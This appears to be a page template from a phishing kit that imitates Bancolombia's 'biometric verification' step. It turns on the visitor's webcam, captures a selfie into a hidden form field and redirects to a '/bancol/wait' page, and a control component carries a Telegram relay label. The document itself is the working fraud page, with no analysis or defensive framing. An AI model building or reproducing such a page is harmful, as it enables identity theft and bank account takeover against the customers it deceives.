<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Bancolombia - Verificacion Biometrica</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bancolombia-yellow': '#fdda24',
                    }
                }
            }
        }
    </script>
    <style>
        @font-face {
            font-family: 'bancolombia';
            src: url('/3co/fonts/bancolombia.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-Regular.woff') format('woff'),
                url('/3co/fonts/OpenSans-Regular.ttf') format('truetype');
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: "Open Sans";
            src: url('/3co/fonts/OpenSans-SemiBold.woff') format('woff'),
                url('/3co/fonts/OpenSans-SemiBold.ttf') format('truetype');
            font-weight: 600;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansBold.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansBold.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }

        @font-face {
            font-family: "CIB Sans";
            src: url('/3co/fonts/CIBFontSansLight.woff2') format('woff2'),
                url('/3co/fonts/CIBFontSansLight.woff') format('woff');
            font-weight: 300;
            font-style: normal;
        }

        body {
            font-family: 'Open Sans', sans-serif;
        }

        .font-cib-sans-bold {
            font-family: 'CIB Sans', sans-serif;
            font-weight: 700;
        }

        .bg-bancolombia {
            background-image: url('/3co/assets/bgImage.svg');
            background-position: bottom;
            background-repeat: no-repeat;
        }

        .camera-container {
            position: relative;
            width: 100%;
            aspect-ratio: 1;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
        }

        #video, #canvas, #preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        #canvas {
            display: none;
        }

        #preview {
            display: none;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }

        .face-guide {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 70%;
            height: 85%;
            border: 3px dashed rgba(253, 218, 36, 0.7);
            border-radius: 50%;
        }

        .face-guide.captured {
            border-color: #22c55e;
        }

        .loading-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #fdda24;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body class="bg-gray-100">

    <!-- Header -->
    <div class="w-full flex justify-center items-center py-3 z-50">
        <div class="w-[98%] flex gap-10 items-center">
            <img src="/3co/assets/header.svg" class="ml-[25%] w-[45%] object-contain" alt="Bancolombia" />
            <div class="flex justify-center items-center gap-1.5 cursor-pointer">
                <span class="text-[15px]">Salir</span>
                <img src="/3co/assets/exitHeader.svg" class="w-5 object-contain" alt="Salir" />
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <div class="bg-bancolombia min-h-[70vh] w-[90%] mx-auto flex flex-col items-center justify-start">

        <div id="selfieSection" class="w-full flex flex-col justify-center items-center pb-6">
            <h5 class="text-[24px] font-cib-sans-bold mt-6">Verificacion biometrica</h5>
            <p class="text-gray-600 text-[14px] mt-1 text-center">Tome una selfie para verificar su identidad</p>

            <div class="w-full flex mt-4 flex-col justify-center items-center gap-4">
                <div class="w-full bg-white py-5 px-4 rounded-xl flex flex-col items-center">

                    <!-- Error de cámara -->
                    <div id="cameraError" class="hidden w-full text-center py-8">
                        <div class="text-red-500 mb-2">
                            <svg class="w-12 h-12 mx-auto" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                            </svg>
                        </div>
                        <p class="text-red-600 font-semibold">No se pudo acceder a la camara</p>
                        <p class="text-gray-500 text-sm mt-1">Permita el acceso a la camara en su navegador</p>
                    </div>

                    <!-- Contenedor de cámara -->
                    <div id="cameraWrapper" class="w-full">
                        <div class="camera-container">
                            <video id="video" autoplay playsinline></video>
                            <canvas id="canvas"></canvas>
                            <img id="preview" alt="Vista previa">
                            <div class="overlay">
                                <div class="face-guide" id="faceGuide"></div>
                            </div>
                        </div>

                        <!-- Instrucciones -->
                        <div class="mt-4 bg-gray-50 rounded-lg p-3">
                            <ul class="text-[12px] text-gray-600 space-y-1">
                                <li class="flex items-center gap-2">
                                    <span class="text-green-500 font-bold">✓</span>
                                    Ubique su rostro dentro del ovalo
                                </li>
                                <li class="flex items-center gap-2">
                                    <span class="text-green-500 font-bold">✓</span>
                                    Asegurese de tener buena iluminacion
                                </li>
                                <li class="flex items-center gap-2">
                                    <span class="text-green-500 font-bold">✓</span>
                                    No use gafas de sol ni gorras
                                </li>
                                <li class="flex items-center gap-2">
                                    <span class="text-green-500 font-bold">✓</span>
                                    Mantenga una expresion neutral
                                </li>
                            </ul>
                        </div>
                    </div>

                    <form id="formSelfie" class="w-full mt-4">
                        <input type="hidden" id="selfie" name="selfie">
                        <input type="hidden" id="no-status" name="status" value="selfie">

                        <div class="flex flex-col gap-3">
                            <button type="button" id="btnCapturar"
                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer">
                                Tomar Foto
                            </button>

                            <button type="submit" id="enviar"
                                class="w-full font-bold py-3 px-6 rounded-full bg-bancolombia-yellow text-black cursor-pointer hidden">
                                Continuar
                            </button>

                            <button type="button" id="btnReintentar"
                                class="w-full font-semibold py-2 px-6 rounded-full border-2 border-gray-400 text-gray-600 cursor-pointer hidden">
                                Volver a Tomar
                            </button>
                        </div>
                    </form>

                </div>
            </div>
        </div>

    </div>

    <!-- Footer -->
    <div class="w-full flex flex-col justify-center items-center py-7">
        <div class="w-[90%] border-t border-gray-300"></div>
        <img src="/3co/assets/header.svg" class="w-[40%] object-contain" alt="Bancolombia" />
        <img src="/3co/assets/foter.svg" class="w-[40%] object-contain mt-0.5" alt="Footer" />
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const preview = document.getElementById('preview');
        const btnCapturar = document.getElementById('btnCapturar');
        const btnEnviar = document.getElementById('enviar');
        const btnReintentar = document.getElementById('btnReintentar');
        const selfieData = document.getElementById('selfie');
        const cameraError = document.getElementById('cameraError');
        const cameraWrapper = document.getElementById('cameraWrapper');
        const faceGuide = document.getElementById('faceGuide');

        let stream = null;

        async function iniciarCamara() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 640 }
                    },
                    audio: false
                });
                video.srcObject = stream;
            } catch (error) {
                console.error('Error al acceder a la camara:', error);
                cameraWrapper.style.display = 'none';
                cameraError.classList.remove('hidden');
            }
        }

        function capturarFoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            selfieData.value = imageData;

            preview.src = imageData;
            video.style.display = 'none';
            preview.style.display = 'block';

            btnCapturar.style.display = 'none';
            btnEnviar.classList.remove('hidden');
            btnReintentar.classList.remove('hidden');

            faceGuide.classList.add('captured');
        }

        function reiniciarCaptura() {
            video.style.display = 'block';
            preview.style.display = 'none';
            selfieData.value = '';

            btnCapturar.style.display = 'block';
            btnEnviar.classList.add('hidden');
            btnReintentar.classList.add('hidden');

            faceGuide.classList.remove('captured');
        }

        btnCapturar.addEventListener('click', capturarFoto);
        btnReintentar.addEventListener('click', reiniciarCaptura);

        iniciarCamara();
    </script>

    <x-control
        :auto-completar="false"
        :debug="false"
        redirect-url="/bancol/wait"
        toast-message="No se pudo verificar su identidad, intente nuevamente"
        telegram-button="SELFIE"
    />

</body>

</html>
